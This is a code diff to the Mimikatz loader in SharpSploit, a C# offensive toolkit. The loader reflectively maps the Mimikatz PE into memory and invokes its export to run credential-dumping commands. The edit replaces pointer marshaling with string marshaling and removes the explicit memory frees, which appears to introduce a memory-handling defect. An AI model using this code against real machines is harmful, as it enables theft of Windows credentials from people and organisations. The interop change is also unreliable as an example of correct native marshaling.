@@ -11,6 +11,7 @@ using System.Runtime.InteropServices;
 using SharpSploit.Misc;
 using SharpSploit.Execution.ManualMap;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
+using SharpSploit.Persistence;
 
 namespace SharpSploit.Credentials
 {
@@ -31,8 +32,9 @@ namespace SharpSploit.Credentials
         private static byte[] PEBytes64 { get; set; }
 
         private static PE MimikatzPE { get; set; } = null;
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate IntPtr MimikatzType(IntPtr command);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet =CharSet.Unicode)]
+        private delegate string MimikatzType(string command);
 
         /// <summary>
         /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
@@ -73,10 +75,10 @@ namespace SharpSploit.Credentials
                 return ex.Message;
             }
 
-            IntPtr input = Marshal.StringToHGlobalUni(Command);
+            string input = Command;
             try
             {
-                IntPtr output = IntPtr.Zero;
+                string output = "";
                 Thread t = new Thread(() =>
                 {
                     try
@@ -86,7 +88,7 @@ namespace SharpSploit.Credentials
                             input
                         };
 
-                        output = (IntPtr) Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
+                        output = (string) Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                     }
                     catch (Exception e)
                     {
@@ -95,14 +97,13 @@ namespace SharpSploit.Credentials
                 });
                 t.Start();
                 t.Join();
-                Marshal.FreeHGlobal(input);
-                if (output == IntPtr.Zero)
+
+                if (output == "")
                 {
                     return "";
                 }
-                string stroutput = Marshal.PtrToStringUni(output);
-                PInvoke.Win32.Kernel32.LocalFree(output);
-                return stroutput;
+
+                return output;
             }
             catch (Exception e)
             {
